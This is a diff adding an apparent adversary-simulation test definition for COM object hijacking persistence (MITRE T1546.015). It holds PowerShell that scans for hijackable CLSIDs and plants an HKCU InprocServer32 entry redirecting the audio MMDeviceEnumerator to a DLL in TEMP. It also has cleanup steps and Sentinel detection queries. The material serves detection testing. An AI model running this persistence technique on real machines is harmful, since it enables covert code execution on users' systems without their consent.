@@ -1,0 +1,96 @@
+id: T1546.015_event_triggered_execution_com_object_hijacking
+name: "Event Triggered Execution — Component Object Model Hijacking"
+mitre_technique: "T1546.015"
+mitre_tactic: "persistence"
+description: >
+  Adversaries hijack COM object references by adding entries to HKCU\Software\Classes\CLSID
+  that shadow the HKCR system-wide entries. When an application tries to instantiate a
+  COM object by its CLSID, Windows checks HKCU first — the adversary's DLL loads
+  instead of the legitimate one. Since HKCU requires no elevation, this is a
+  no-privilege-escalation persistence technique. The hijacked COM object must be one
+  that legitimate applications call regularly to trigger execution.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1546/015/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1546.015 — COM Object Hijacking persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Identify commonly-used COM objects suitable for hijacking"
+    command: |
+      Write-Host "[PAS] Searching for COM objects with missing or user-overridable InprocServer32:"
+      # Find CLSIDs registered in HKCR that have LocalServer32 but no InprocServer32
+      # (can be hijacked by creating HKCU\Software\Classes\CLSID\{guid}\InprocServer32)
+      $count = 0
+      Get-ChildItem "HKCR:\CLSID" -ErrorAction SilentlyContinue |
+          Select-Object -First 50 | ForEach-Object {
+              $localSvr = Test-Path "$($_.PSPath)\LocalServer32"
+              $inproc   = Test-Path "$($_.PSPath)\InprocServer32"
+              if ($localSvr -and -not $inproc) {
+                  $name = (Get-ItemProperty $_.PSPath -Name "(Default)" -ErrorAction SilentlyContinue)."(Default)"
+                  if ($name) { Write-Host "  Hijackable: $($_.PSChildName) ($name)"; $count++ }
+              }
+          }
+      Write-Host "[PAS] Scanned 50 CLSIDs — $count potential hijack targets"
+
+  - step: 3
+    type: exec_powershell
+    description: "Plant COM hijack in HKCU — no elevation required"
+    command: |
+      $malDll  = "$env:TEMP\PAS_T1546_015_comhijack.dll"
+      Copy-Item "$env:SystemRoot\System32\version.dll" $malDll -Force -ErrorAction SilentlyContinue
+
+      # Use a well-known frequently-called CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}
+      # This is the MMDeviceEnumerator — called by many audio/media apps
+      $clsid   = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
+      $comPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
+
+      New-Item -Path $comPath -Force | Out-Null
+      Set-ItemProperty $comPath -Name "(Default)"    -Value $malDll
+      Set-ItemProperty $comPath -Name "ThreadingModel" -Value "Apartment"
+
+      Write-Host "[PAS] COM hijack planted: HKCU CLSID $clsid"
+      Write-Host "[PAS] -> $malDll"
+      Write-Host "[PAS] Any app instantiating MMDeviceEnumerator now loads malicious DLL"
+      Write-Host "[PAS] No elevation required — HKCU shadows HKCR"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — new InprocServer32 under HKCU\\Software\\Classes\\CLSID pointing to TEMP/AppData"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove COM hijack registry entry and DLL"
+    command: |
+      $clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
+      Remove-Item "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1546_015_comhijack.dll" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] COM hijack removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1546.015 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: new InprocServer32 key created under HKCU\\Software\\Classes\\CLSID"
+  - "File event: DLL loaded from TEMP or AppData into unexpected process via COM"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'HKCU' and RegistryKey contains 'CLSID' and RegistryKey contains 'InprocServer32'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryValueData contains 'Temp' and RegistryKey contains 'InprocServer32'"
+  - "MDE alert: 'COM object hijacked via HKCU registry'"
+  - "CONTROL CHECK: Periodically enumerate HKCU\\Software\\Classes\\CLSID — any InprocServer32 pointing to non-system paths is malicious"
+  - "CONTROL CHECK: Process Monitor can reveal COM loading events — useful for incident investigation"
